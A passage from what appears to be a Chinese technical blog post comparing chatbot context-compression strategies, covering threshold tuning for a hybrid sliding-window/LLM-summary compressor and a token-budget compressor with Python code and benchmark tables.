<span class="hljs-built_in">print</span>(<span class="hljs-string">f"平均Token (滑动窗口): <span class="hljs-subst">{stats[<span class="hljs-string">'avg_tokens_sliding'</span>]:<span class="hljs-number">.0</span>f}</span>"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"平均Token (LLM): <span class="hljs-subst">{stats[<span class="hljs-string">'avg_tokens_llm'</span>]:<span class="hljs-number">.0</span>f}</span>"</span>)

<span class="hljs-comment"># 根据统计调整阈值</span>
<span class="hljs-keyword">if</span> stats[<span class="hljs-string">'llm_ratio'</span>] &gt; <span class="hljs-number">0.9</span>:
    <span class="hljs-comment"># 90%都在用LLM，阈值太低</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"建议提高阈值到15轮"</span>)
<span class="hljs-keyword">elif</span> stats[<span class="hljs-string">'llm_ratio'</span>] &lt; <span class="hljs-number">0.5</span>:
    <span class="hljs-comment"># 只有50%用LLM，可能阈值太高</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"建议降低阈值到8轮"</span>)
</code></pre>
<p><strong>2. A/B测试不同阈值</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 对照组：阈值10轮</span>
group_a = HybridCompressor(llm, threshold_turns=<span class="hljs-number">10</span>)

<span class="hljs-comment"># 实验组：阈值15轮</span>
group_b = HybridCompressor(llm, threshold_turns=<span class="hljs-number">15</span>)

<span class="hljs-comment"># 观察指标：</span>
<span class="hljs-comment"># 1. 用户满意度（能否记住信息）</span>
<span class="hljs-comment"># 2. 总Token成本</span>
<span class="hljs-comment"># 3. 平均响应时间</span>
<span class="hljs-comment"># 4. 用户重复率（是否重复说过的话）</span>

<span class="hljs-comment"># 运行一周后对比</span>
</code></pre>
<p><strong>3. 针对不同用户类型使用不同阈值</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AdaptiveHybridCompressor</span>:
    <span class="hljs-string">"""根据用户类型动态调整阈值"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, llm</span>):
        self.llm = llm
        self.user_thresholds = {}
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">compress</span>(<span class="hljs-params">self, user_id, messages</span>):
        <span class="hljs-comment"># 获取用户专属阈值</span>
        threshold = self.get_user_threshold(user_id)
        
        compressor = HybridCompressor(self.llm, threshold_turns=threshold)
        <span class="hljs-keyword">return</span> compressor.compress(messages)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_user_threshold</span>(<span class="hljs-params">self, user_id</span>):
        <span class="hljs-string">"""根据用户类型返回阈值"""</span>
        user_type = get_user_type(user_id)
        
        <span class="hljs-keyword">if</span> user_type == <span class="hljs-string">"vip"</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-number">8</span>  <span class="hljs-comment"># VIP用户，更早用LLM</span>
        <span class="hljs-keyword">elif</span> user_type == <span class="hljs-string">"free"</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-number">15</span>  <span class="hljs-comment"># 免费用户，更多用滑动窗口</span>
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-number">10</span>  <span class="hljs-comment"># 普通用户，标准阈值</span>
</code></pre>
<p><strong>4. 成本控制</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">BudgetAwareCompressor</span>:
    <span class="hljs-string">"""有预算限制的混合策略"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, llm, daily_budget=<span class="hljs-number">10.0</span></span>):
        self.compressor = HybridCompressor(llm, threshold_turns=<span class="hljs-number">10</span>)
        self.daily_budget = daily_budget
        self.today_cost = <span class="hljs-number">0.0</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">compress</span>(<span class="hljs-params">self, messages</span>):
        turn_count = <span class="hljs-built_in">len</span>(messages) // <span class="hljs-number">2</span>
        
        <span class="hljs-comment"># 检查预算</span>
        <span class="hljs-keyword">if</span> turn_count &gt; <span class="hljs-number">10</span>:  <span class="hljs-comment"># 会使用LLM</span>
            estimated_cost = <span class="hljs-number">0.0001</span>
            <span class="hljs-keyword">if</span> self.today_cost + estimated_cost &gt; self.daily_budget:
                <span class="hljs-comment"># 预算不足，强制使用滑动窗口</span>
                logger.warning(<span class="hljs-string">"Daily budget exceeded, using sliding window"</span>)
                <span class="hljs-keyword">return</span> SlidingWindowCompressor(keep_turns=<span class="hljs-number">5</span>).compress(messages)
            
            self.today_cost += estimated_cost
        
        <span class="hljs-keyword">return</span> self.compressor.compress(messages)
</code></pre>
<hr/>
<h4 data-id="heading-60"><strong>小结</strong></h4>
<p>混合策略的真实表现：</p>
<pre><code class="hljs language-diff" lang="diff">定位：
不是最快的（滑动窗口最快）
不是最省Token的（滑动窗口最省）
不是最省钱的（滑动窗口$0）

而是：在"用户体验"和"系统效率"之间的智能权衡

核心价值：
✅ 短对话：完全等同于滑动窗口（测试验证）
✅ 长对话：100%保留用户信息
✅ 自动适应：无需人工判断
✅ 成本优化：比纯LLM节省20%

付出代价：
❌ Token效率差（长对话多用4-5倍）
❌ 速度慢（长对话需要10-15秒）
❌ 系统复杂度增加
❌ 阈值需要调优

最佳实践：
<span class="hljs-deletion">- 推荐阈值：10轮</span>
<span class="hljs-deletion">- 监控使用比例</span>
<span class="hljs-deletion">- A/B测试优化</span>
<span class="hljs-deletion">- 根据用户类型调整</span>
</code></pre>
<p><strong>结论：混合策略是生产环境最实用的方案，适合通用对话场景，但要理解它的trade-off。</strong></p>
<hr/>
<h3 data-id="heading-61"><strong>3.5 策略4：Token动态压缩（Token-based）</strong></h3>
<h4 data-id="heading-62"><strong>核心原理</strong></h4>
<p>Token动态压缩是一种<strong>精确控制</strong>策略：不按轮数，而是按Token预算精确压缩。</p>
<pre><code class="hljs language-markdown" lang="markdown">工作流程：
┌─────────────────┐
│ 设定Token预算    │
│  (如200 tokens) │
└────────┬────────┘
<span class="hljs-code">         │
    ┌────▼──────────┐
    │ 从后往前累加    │
    │ 计算Token数    │
    └────┬──────────┘
         │
    ┌────▼──────────┐
    │ 达到预算？      │
    │ 是 → 停止      │
    │ 否 → 继续添加   │
    └────┬──────────┘
         │
    ┌────▼──────────┐
    │ 返回压缩结果    │
    └───────────────┘
</span></code></pre>
<p><strong>核心思想：</strong></p>
<pre><code class="hljs language-makefile" lang="makefile">不关心保留<span class="hljs-string">"几轮"</span>
只关心保留<span class="hljs-string">"多少Token"</span>

从最新消息开始累加：
<span class="hljs-section">msg_last:  15 tokens → 累计 15</span>
<span class="hljs-section">msg_last-1: 14 tokens → 累计 29</span>
<span class="hljs-section">msg_last-2: 13 tokens → 累计 42</span>
...
累计达到200 → 停止
</code></pre>
<p><strong>与滑动窗口的本质区别：</strong></p>
<pre><code class="hljs language-diff" lang="diff">滑动窗口：
<span class="hljs-deletion">- 保留固定"条数"（如10条）</span>
<span class="hljs-deletion">- Token数不可控（可能100，也可能200）</span>

Token动态：
<span class="hljs-deletion">- 保留固定"Token数"（如200）</span>
<span class="hljs-deletion">- 消息条数不固定（根据每条消息长度）</span>
</code></pre>
<h4 data-id="heading-63"><strong>代码实现</strong></h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">List</span>, <span class="hljs-type">Dict</span>, <span class="hljs-type">Callable</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">TokenBasedCompressor</span>:
    <span class="hljs-string">"""
    Token动态压缩器
    
    特点：
    - 精确控制Token数量
    - 充分利用上下文窗口
    - 适应消息长度差异
    """</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, token_counter: <span class="hljs-type">Callable</span>, max_tokens: <span class="hljs-built_in">int</span> = <span class="hljs-number">200</span></span>):
        <span class="hljs-string">"""
        Args:
            token_counter: Token计数函数（如 llm.count_tokens）
            max_tokens: Token预算
        """</span>
        self.token_counter = token_counter
        self.max_tokens = max_tokens
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">compress</span>(<span class="hljs-params">self, messages: <span class="hljs-type">List</span>[<span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-built_in">str</span>]]</span>) -&gt; <span class="hljs-type">List</span>[<span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-built_in">str</span>]]:
        <span class="hljs-string">"""
        压缩到Token预算内
        
        策略：
        1. 计算总Token数
        2. 如果超预算，从最早的消息开始删除
        3. 直到满足预算
        
        Args:
            messages: 原始消息列表
            
        Returns:
            压缩后的消息列表
        """</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> messages:
            <span class="hljs-keyword">return</span> messages
        
        <span class="hljs-comment"># 计算当前总Token数</span>
        total_tokens = <span class="hljs-built_in">sum</span>(self.token_counter(m[<span class="hljs-string">'content'</span>]) <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> messages)
        
        <span class="hljs-comment"># 如果没超预算，直接返回</span>
        <span class="hljs-keyword">if</span> total_tokens &lt;= self.max_tokens:
            <span class="hljs-keyword">return</span> messages
        
        <span class="hljs-comment"># 从最早的消息开始删除，直到满足预算</span>
        compressed = messages[:]
        current_tokens = total_tokens
        
        <span class="hljs-keyword">while</span> compressed <span class="hljs-keyword">and</span> current_tokens &gt; self.max_tokens:
            <span class="hljs-comment"># 删除最早的消息</span>
            removed = compressed.pop(<span class="hljs-number">0</span>)
            removed_tokens = self.token_counter(removed[<span class="hljs-string">'content'</span>])
            current_tokens -= removed_tokens
        
        <span class="hljs-keyword">return</span> compressed
</code></pre>
<p><strong>使用示例：</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> src.llm.deepseek <span class="hljs-keyword">import</span> DeepSeekLLM

llm = DeepSeekLLM()
compressor = TokenBasedCompressor(llm.count_tokens, max_tokens=<span class="hljs-number">200</span>)

<span class="hljs-comment"># 压缩</span>
result = compressor.compress(messages)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"压缩到 <span class="hljs-subst">{<span class="hljs-built_in">sum</span>(llm.count_tokens(m[<span class="hljs-string">'content'</span>]) <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> result)}</span> tokens"</span>)
</code></pre>
<p>完整代码见：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fsotopelaez092-star%2Fmemory-chatbot%2Fblob%2Fmain%2Ftests%2Ftest_token_based.py" target="_blank" title="https://github.com/sotopelaez092-star/memory-chatbot/blob/main/tests/test_token_based.py" ref="nofollow noopener noreferrer">github.com/sotopelaez0…</a></p>
<h4 data-id="heading-64"><strong>真实性能测试</strong></h4>
<p>我们对Token动态压缩器进行了完整测试，以下是真实数据：</p>
<hr/>
<p><strong>测试1：Token控制精度</strong></p>
<p>测试不同预算的精度：</p>
<p><strong>长对话（20轮，560 tokens）：</strong></p>








































<table><thead><tr><th>目标Token</th><th>实际Token</th><th>误差</th><th>消息数</th><th>压缩率</th></tr></thead><tbody><tr><td>100</td><td>86</td><td>14.0%</td><td>6条</td><td>84.6%</td></tr><tr><td>200</td><td>193</td><td><strong>3.5%</strong> ✅</td><td>13条</td><td>65.5%</td></tr><tr><td>300</td><td>300</td><td><strong>0.0%</strong> ✅</td><td>21条</td><td>46.4%</td></tr><tr><td>500</td><td>488</td><td><strong>2.4%</strong> ✅</td><td>36条</td><td>12.9%</td></tr></tbody></table>
<p><strong>超长对话（30轮，933 tokens）：</strong></p>








































<table><thead><tr><th>目标Token</th><th>实际Token</th><th>误差</th><th>消息数</th><th>压缩率</th></tr></thead><tbody><tr><td>100</td><td>96</td><td><strong>4.0%</strong> ✅</td><td>7条</td><td>89.7%</td></tr><tr><td>200</td><td>191</td><td><strong>4.5%</strong> ✅</td><td>13条</td><td>79.5%</td></tr><tr><td>300</td><td>298</td><td><strong>0.7%</strong> ✅</td><td>20条</td><td>68.1%</td></tr><tr><td>500</td><td>484</td><td><strong>3.2%</strong> ✅</td><td>34条</td><td>48.1%</td></tr></tbody></table>
<p><strong>关键发现：精度优秀！</strong></p>
<pre><code class="hljs language-matlab" lang="matlab">误差分析：
- 目标<span class="hljs-number">100</span>：误差<span class="hljs-number">4</span><span class="hljs-number">-14</span><span class="hljs-comment">%（预算太小，单条消息可能&gt;10 tokens）</span>
- 目标<span class="hljs-number">200</span>：误差<span class="hljs-number">3.5</span><span class="hljs-number">-4.5</span><span class="hljs-comment">%（优秀）</span>
- 目标<span class="hljs-number">300</span>：误差<span class="hljs-number">0</span><span class="hljs-number">-0.7</span><span class="hljs-comment">%（完美）</span>
- 目标<span class="hljs-number">500</span>：误差<span class="hljs-number">2.4</span><span class="hljs-number">-3.2</span><span class="hljs-comment">%（优秀）</span>

结论：预算≥<span class="hljs-number">200</span>时，误差&lt;<span class="hljs-number">5</span><span class="hljs-comment">%</span>
</code></pre>
<p><strong>为什么有误差？</strong></p>
<pre><code class="hljs language-ini" lang="ini">原因：每条消息Token数不同
- <span class="hljs-attr">"嗯"</span> = <span class="hljs-number">1</span> token
- <span class="hljs-attr">"我叫Tom"</span> = <span class="hljs-number">5</span> tokens
- <span class="hljs-attr">"详细解释..."</span> = <span class="hljs-number">30</span> tokens

从后往前累加，无法精确凑到目标值

例如：
目标200，累计197时：
- 下一条消息15 tokens → 总计212（超了）
- 停在197 ✓（误差3 tokens）
</code></pre>
<hr/>
<p><strong>测试2：速度测试</strong></p>
<pre><code class="hljs language-makefile" lang="makefile">测试对话：20轮（42条消息）

<span class="hljs-section">压缩1次:   0.55ms</span>
<span class="hljs-section">压缩10次:  3.27ms  (平均0.33ms)</span>
<span class="hljs-section">压缩50次:  19.13ms (平均0.38ms)</span>

平均速度：0.38ms
</code></pre>
<p><strong>对比其他策略：</strong></p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">Token动态: 0.38ms</span>
<span class="hljs-section">滑动窗口: 0.00ms</span>
<span class="hljs-section">LLM摘要:  11,000ms</span>

vs 滑动窗口：慢，但仍在1ms内 ✅
vs LLM摘要：快 29,000倍！⭐
</code></pre>
<p><strong>为什么比滑动窗口慢？</strong></p>
<pre><code class="hljs language-scss" lang="scss">滑动窗口：纯数组切片，<span class="hljs-built_in">O</span>(<span class="hljs-number">1</span>)
messages<span class="hljs-selector-attr">[-10:]</span>  # 极快

Token动态：需要逐条计算Token，<span class="hljs-built_in">O</span>(n)
for msg in messages:
    tokens += <span class="hljs-built_in">count_tokens</span>(msg[<span class="hljs-string">'content'</span>])
</code></pre>
<p><strong>结论：虽然比滑动窗口慢，但都在1ms内，可以忽略。</strong></p>
<hr/>
<p><strong>测试3：四种策略全面对比</strong></p>
<p>配置：</p>
<ul>
<li>Token动态：目标200 tokens</li>
<li>滑动窗口：保留5轮</li>
<li>LLM摘要：保留3轮+摘要</li>
<li>混合策略：阈值10轮，保留5轮</li>
</ul>
<hr/>
<p><strong>场景1：短对话（5轮，126 tokens）</strong></p>













































<table><thead><tr><th>策略</th><th>结果</th><th>Token</th><th>压缩率</th><th>耗时</th><th>成本</th></tr></thead><tbody><tr><td><strong>Token动态</strong></td><td>10条</td><td><strong>126</strong></td><td>0%</td><td>0.06ms</td><td>$0</td></tr><tr><td><strong>滑动窗口</strong></td><td>10条</td><td><strong>126</strong></td><td>0%</td><td>0.00ms</td><td>$0</td></tr><tr><td>混合策略</td><td>10条</td><td>126</td><td>0%</td><td>0.01ms</td><td>$0</td></tr><tr><td>LLM摘要</td><td>7条</td><td>292</td><td>-132% ❌</td><td>7,151ms</td><td>$0.0001</td></tr></tbody></table>
<p><strong>对比分析：</strong></p>
<pre><code class="hljs language-markdown" lang="markdown">✅ Token动态 vs 滑动窗口：完全相同
<span class="hljs-bullet">   -</span> 原因：对话太短，都不需要压缩
</code></pre>
<hr/>
<p><strong>场景2：中等对话（10轮，249 tokens）</strong></p>













































<table><thead><tr><th>策略</th><th>结果</th><th>Token</th><th>压缩率</th><th>耗时</th><th>成本</th></tr></thead><tbody><tr><td><strong>滑动窗口</strong></td><td>10条</td><td><strong>123</strong> ⭐</td><td>51%</td><td>0.00ms</td><td>$0</td></tr><tr><td>Token动态</td><td>15条</td><td>194</td><td>22%</td><td>0.23ms</td><td>$0</td></tr><tr><td>混合策略</td><td>10条</td><td>123</td><td>51%</td><td>0.01ms</td><td>$0</td></tr><tr><td>LLM摘要</td><td>7条</td><td>368</td><td>-48% ❌</td><td>6,631ms</td><td>$0.0001</td></tr></tbody></table>
<p><strong>对比分析：</strong></p>
<pre><code class="hljs language-diff" lang="diff">⚠️ Token动态 vs 滑动窗口：Token多71个（58%更多）

原因：
<span class="hljs-deletion">- 滑动窗口：固定保留10条（123 tokens）</span>
<span class="hljs-deletion">- Token动态：保留到200预算（194 tokens, 15条）</span>

Token动态保留了更多消息，但也用了更多Token
</code></pre>
<p><strong>这是Token动态的核心特点：充分利用预算。</strong></p>
<hr/>
<p><strong>场景3：长对话（20轮，560 tokens）</strong></p>













































<table><thead><tr><th>策略</th><th>结果</th><th>Token</th><th>压缩率</th><th>耗时</th><th>成本</th></tr></thead><tbody><tr><td><strong>滑动窗口</strong></td><td>10条</td><td><strong>145</strong> ⭐</td><td>74%</td><td>0.00ms</td><td>$0</td></tr><tr><td>Token动态</td><td>13条</td><td>193</td><td>66%</td><td>0.53ms</td><td>$0</td></tr><tr><td>混合策略</td><td>11条</td><td>574</td><td>-3% ❌</td><td>10,451ms</td><td>$0.0001</td></tr><tr><td>LLM摘要</td><td>7条</td><td>547</td><td>2%</td><td>11,619ms</td><td>$0.0001</td></tr></tbody></table>
<p><strong>对比分析：</strong></p>
<pre><code class="hljs language-erlang" lang="erlang">⚠️ Token动态 vs 滑动窗口：Token多<span class="hljs-number">48</span>个（<span class="hljs-number">33</span><span class="hljs-comment">%更多）</span>

原因同上：Token动态尽量用满预算
</code></pre>
<hr/>
<p><strong>场景4：超长对话（30轮，933 tokens）</strong></p>













































<table><thead><tr><th>策略</th><th>结果</th><th>Token</th><th>压缩率</th><th>耗时</th><th>成本</th></tr></thead><tbody><tr><td><strong>滑动窗口</strong></td><td>10条</td><td><strong>144</strong> ⭐</td><td>85%</td><td>0.00ms</td><td>$0</td></tr><tr><td>Token动态</td><td>13条</td><td>191</td><td>80%</td><td>1.24ms</td><td>$0</td></tr><tr><td>混合策略</td><td>11条</td><td>689</td><td>26%</td><td>13,879ms</td><td>$0.0001</td></tr><tr><td>LLM摘要</td><td>7条</td><td>621</td><td>33%</td><td>12,712ms</td><td>$0.0001</td></tr></tbody></table>
<p><strong>对比分析：</strong></p>
<pre><code class="hljs language-diff" lang="diff">⚠️ Token动态 vs 滑动窗口：Token多47个（33%更多）

结论：
<span class="hljs-deletion">- Token效率：滑动窗口最优</span>
<span class="hljs-deletion">- 信息保留：Token动态更多（13条 vs 10条）</span>
</code></pre>
<hr/>
<p><strong>测试4：不同Token预算的效果</strong></p>
<p>在20轮对话（560 tokens）中测试不同预算：</p>















































<table><thead><tr><th>Token预算</th><th>实际Token</th><th>消息数</th><th>压缩率</th><th>适用场景</th></tr></thead><tbody><tr><td>50</td><td>49</td><td>4条</td><td>91.2%</td><td>极限压缩（仅保留最新1-2条）</td></tr><tr><td>100</td><td>86</td><td>6条</td><td>84.6%</td><td>严格限制（约2-3轮）</td></tr><tr><td><strong>200</strong></td><td><strong>193</strong></td><td><strong>13条</strong></td><td><strong>65.5%</strong></td><td><strong>中等限制（约5轮）</strong> ⭐</td></tr><tr><td>300</td><td>300</td><td>21条</td><td>46.4%</td><td>宽松限制（约8轮）</td></tr><tr><td>500</td><td>488</td><td>36条</td><td>12.9%</td><td>基本不压缩（约15轮）</td></tr></tbody></table>
<p><strong>关键发现：</strong></p>
<pre><code class="hljs language-diff" lang="diff">预算越高：
<span class="hljs-deletion">- Token越多 ✅</span>
<span class="hljs-deletion">- 消息数越多 ✅</span>
<span class="hljs-deletion">- 压缩率越低 ✅</span>
<span class="hljs-deletion">- 信息保留越好 ✅</span>

推荐预算：200-300 tokens
<span class="hljs-deletion">- 200：约5轮，适合大多数场景</span>
<span class="hljs-deletion">- 300：约8轮，适合信息密集场景</span>
</code></pre>
<hr/>
<p><strong>测试5：信息保留对比</strong></p>
<p>15轮对话，包含5个关键信息：Tom、28岁、上海、浦东、AI工程师</p>

































<table><thead><tr><th>Token预算</th><th>实际Token</th><th>保留消息</th><th>信息保留率</th><th>详情</th></tr></thead><tbody><tr><td>100</td><td>92</td><td>27条</td><td><strong>40%</strong> ❌</td><td>✅ 浦东, AI工程师<br/>❌ Tom, 28岁, 上海</td></tr><tr><td><strong>200</strong></td><td>113</td><td>30条</td><td><strong>100%</strong> ✅</td><td>✅ 全部保留</td></tr><tr><td>300</td><td>113</td><td>30条</td><td><strong>100%</strong> ✅</td><td>✅ 全部保留</td></tr></tbody></table>
<p><strong>关键发现：</strong></p>
<pre><code class="hljs language-erlang" lang="erlang">预算<span class="hljs-number">100</span>：只保留<span class="hljs-number">40</span><span class="hljs-comment">%信息（丢失关键背景）</span>
预算<span class="hljs-number">200</span>：保留<span class="hljs-number">100</span><span class="hljs-comment">%信息（完美）</span>

临界点：约<span class="hljs-number">150</span>-<span class="hljs-number">200</span> tokens

建议：预算≥<span class="hljs-number">200</span>才能保证信息完整性
</code></pre>
<p><strong>为什么预算200和300结果相同？</strong></p>
<pre><code class="hljs">原因：这个15轮对话总共才113 tokens

所以预算≥113时，都是全部保留
</code></pre>
<hr/>
<p><strong>测试6：边界情况</strong></p>








































<table><thead><tr><th>场景</th><th>目标Token</th><th>实际Token</th><th>消息数</th><th>说明</th></tr></thead><tbody><tr><td>预算为0</td><td>0</td><td>0</td><td>0条</td><td>返回空列表</td></tr><tr><td>预算极小</td><td>10</td><td>0</td><td>0条</td><td>单条消息&gt;10，无法保留</td></tr><tr><td>预算=原始</td><td>249</td><td>249</td><td>20条</td><td>保留全部 ✅</td></tr><tr><td>预算=2倍</td><td>498</td><td>249</td><td>20条</td><td>保留全部 ✅</td></tr></tbody></table>
<p><strong>潜在问题：预算太低会返回空！</strong></p>
<pre><code class="hljs language-python" lang="python">预算<span class="hljs-number">10</span>，但第一条消息就<span class="hljs-number">15</span> tokens
→ 无法保留任何消息
→ 返回空列表 ⚠️

建议改进：至少保留<span class="hljs-number">1</span>条最新消息
</code></pre>
<p>完整测试代码：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fsotopelaez092-star%2Fmemory-chatbot%2Fblob%2Fmain%2Ftests%2Ftest_token_based.py" target="_blank" title="https://github.com/sotopelaez092-star/memory-chatbot/blob/main/tests/test_token_based.py" ref="nofollow noopener noreferrer">github.com/sotopelaez0…</a></p>
<hr/>
<h4 data-id="heading-65"><strong>核心矛盾：精确控制 vs 信息保留</strong></h4>
<p>测试数据揭示了Token动态的<strong>核心权衡</strong>：</p>
<p><strong>Token效率对比：</strong></p>
<pre><code class="hljs language-erlang" lang="erlang">场景：<span class="hljs-number">20</span>轮对话，<span class="hljs-number">560</span> tokens

滑动窗口：<span class="hljs-number">145</span> tokens（保留<span class="hljs-number">10</span>条）⭐
Token动态：<span class="hljs-number">193</span> tokens（保留<span class="hljs-number">13</span>条，预算<span class="hljs-number">200</span>）

差距：<span class="hljs-number">48</span> tokens（<span class="hljs-number">33</span><span class="hljs-comment">%更多）</span>
</code></pre>
<p><strong>为什么Token动态会用更多？</strong></p>
<pre><code class="hljs language-diff" lang="diff">滑动窗口策略：
<span class="hljs-deletion">- 固定保留10条（5轮）</span>
<span class="hljs-deletion">- 不管Token数</span>
<span class="hljs-deletion">- 结果：145 tokens</span>

Token动态策略：
<span class="hljs-deletion">- 尽量用满200预算</span>
<span class="hljs-deletion">- 保留13条</span>
<span class="hljs-deletion">- 结果：193 tokens</span>

核心差异：
<span class="hljs-deletion">- 滑动窗口："省着用"预算</span>
<span class="hljs-deletion">- Token动态："用满"预算</span>
</code></pre>
<p><strong>这不是bug，是设计差异！</strong></p>
<p><strong>信息保留对比：</strong></p>
<pre><code class="hljs language-diff" lang="diff">滑动窗口：
<span class="hljs-deletion">- 10条消息</span>
<span class="hljs-deletion">- 可能丢失早期关键信息 ❌</span>

Token动态（预算200）：
<span class="hljs-deletion">- 13条消息</span>
<span class="hljs-deletion">- 保留更多对话历史 ✅</span>
</code></pre>
<p><strong>结论：Token动态用更多Token，但保留更多信息。</strong></p>
<hr/>
<h4 data-id="heading-66"><strong>优缺点总结</strong></h4>
<p>基于真实测试数据：</p>
<p><strong>✅ 四大优势：</strong></p>
<ol>
<li><strong>精确控制Token数</strong></li>
</ol>

<pre><code class="hljs language-diff" lang="diff">测试数据：误差&lt;5%（预算≥200时）
<span class="hljs-deletion">- 目标200 → 实际193（误差3.5%）</span>
<span class="hljs-deletion">- 目标300 → 实际300（误差0%）</span>

优势：
<span class="hljs-deletion">- 可以精确规划成本</span>
<span class="hljs-deletion">- 充分利用上下文窗口</span>
<span class="hljs-deletion">- 不浪费也不超支</span>
</code></pre>
<ol>
<li><strong>速度极快</strong></li>
</ol>

<pre><code class="hljs">测试数据：0.38ms
vs 滑动窗口：0.00ms（略慢）
vs LLM摘要：11,000ms（快29,000倍）

结论：虽然比滑动窗口慢，但都在1ms内
</code></pre>
<ol>
<li><strong>零成本</strong></li>
</ol>

<pre><code class="hljs language-bash" lang="bash">无需调用LLM API
只是本地Token计数
成本：<span class="hljs-variable">$0</span>
</code></pre>
<ol>
<li><strong>适应消息长度差异</strong></li>
</ol>

<pre><code class="hljs language-diff" lang="diff">场景：消息长度不一
<span class="hljs-deletion">- 短消息："嗯" = 1 token</span>
<span class="hljs-deletion">- 长消息："详细说明..." = 50 tokens</span>

滑动窗口：
<span class="hljs-deletion">- 保留10条，可能是10 tokens，也可能500 tokens</span>
<span class="hljs-deletion">- 不可控 ❌</span>

Token动态：
<span class="hljs-deletion">- 保留到200 tokens</span>
<span class="hljs-deletion">- 精确可控 ✅</span>
</code></pre>
<p><strong>❌ 四大劣势：</strong></p>
<ol>
<li><strong>可能比滑动窗口用更多Token</strong></li>
</ol>

<pre><code class="hljs language-diff" lang="diff">实测数据：
<span class="hljs-deletion">- 10轮对话：Token动态194 vs 滑动窗口123（多58%）</span>
<span class="hljs-deletion">- 20轮对话：Token动态193 vs 滑动窗口145（多33%）</span>
<span class="hljs-deletion">- 30轮对话：Token动态191 vs 滑动窗口144（多33%）</span>

原因：Token动态尽量用满预算
</code></pre>
<ol>
<li><strong>信息保留完全依赖预算</strong></li>
</ol>

<pre><code class="hljs language-diff" lang="diff">实测数据：
<span class="hljs-deletion">- 预算100：保留40%信息 ❌</span>
<span class="hljs-deletion">- 预算200：保留100%信息 ✅</span>

风险：
<span class="hljs-deletion">- 预算设置太低 → 丢失关键信息</span>
<span class="hljs-deletion">- 预算设置太高 → 浪费成本</span>
<span class="hljs-deletion">- 没有"最优预算"，需要根据场景调整</span>
</code></pre>
<ol>
<li><strong>预算太低会返回空</strong></li>
</ol>

<pre><code class="hljs language-diff" lang="diff">实测数据：
<span class="hljs-deletion">- 预算10：返回0条消息 ❌</span>
<span class="hljs-deletion">- 原因：第一条消息就&gt;10 tokens</span>

问题：
<span class="hljs-deletion">- 用户可能完全看不到历史</span>
<span class="hljs-deletion">- 体验很差</span>
</code></pre>
<ol>
<li><strong>需要Token计数器</strong></li>
</ol>

<pre><code class="hljs language-diff" lang="diff">依赖：llm.count_tokens 方法

问题：
<span class="hljs-deletion">- 增加了耦合</span>
<span class="hljs-deletion">- 不同LLM的Token计数可能不同</span>
<span class="hljs-deletion">- 需要额外的函数调用开销</span>
</code></pre>
<hr/>
<h4 data-id="heading-67"><strong>适用场景指南</strong></h4>
<p>基于真实测试数据：</p>
<p><strong>✅ 推荐使用：</strong></p>
<ol>
<li><strong>有明确Token预算限制</strong></li>
</ol>

<pre><code class="hljs language-diff" lang="diff">场景：API有严格Token限制
理由：
<span class="hljs-deletion">- 实测误差&lt;5%</span>
<span class="hljs-deletion">- 可以精确控制在预算内</span>
<span class="hljs-deletion">- 避免超出限制报错</span>

典型：
<span class="hljs-deletion">- GPT-3.5（4K限制）</span>
<span class="hljs-deletion">- 预算紧张的项目</span>
<span class="hljs-deletion">- 按Token付费的场景</span>
</code></pre>
<ol>
<li><strong>消息长度差异大</strong></li>
</ol>

<pre><code class="hljs language-diff" lang="diff">场景：既有短消息，又有长回复
理由：
<span class="hljs-deletion">- 滑动窗口固定条数，Token不可控</span>
<span class="hljs-deletion">- Token动态精确控制Token数</span>

例子：
<span class="hljs-deletion">- 对话1：10条 × 10 tokens = 100 tokens</span>
<span class="hljs-deletion">- 对话2：10条 × 50 tokens = 500 tokens</span>
→ 滑动窗口差异5倍，Token动态统一200
</code></pre>
<ol>
<li><strong>需要充分利用上下文窗口</strong></li>
</ol>

<pre><code class="hljs language-diff" lang="diff">场景：上下文窗口宝贵，希望用满
理由：
<span class="hljs-deletion">- Token动态尽量用满预算</span>
<span class="hljs-deletion">- 实测：保留更多消息（13条 vs 10条）</span>

典型：
<span class="hljs-deletion">- 小模型（上下文窗口小）</span>
<span class="hljs-deletion">- 复杂任务（需要更多历史）</span>
</code></pre>
<p><strong>❌ 不推荐使用：</strong></p>
<ol>
<li><strong>追求最小Token数</strong></li>
</ol>

<pre><code class="hljs language-erlang" lang="erlang">问题：Token动态可能比滑动窗口多<span class="hljs-number">33</span>-<span class="hljs-number">58</span><span class="hljs-comment">%</span>
数据：实测Token动态<span class="hljs-number">193</span> vs 滑动窗口<span class="hljs-number">145</span>
替代：直接用滑动窗口

典型：成本敏感、追求极致压缩
</code></pre>
<ol>
